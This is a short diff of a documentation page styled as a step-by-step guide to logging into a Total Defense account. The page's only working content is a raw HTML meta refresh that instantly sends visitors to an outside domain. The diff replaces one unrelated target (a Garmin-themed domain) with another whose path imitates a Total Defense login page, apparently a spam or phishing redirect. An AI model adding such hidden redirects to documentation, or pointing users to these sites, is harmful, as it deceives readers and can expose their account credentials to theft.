@@ -1,6 +1,6 @@
 .. raw:: html
  
-    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/totaldefense-login">
 
 How to Access Your Total Defense Account: A Step-by-Step Guide
 ============================================
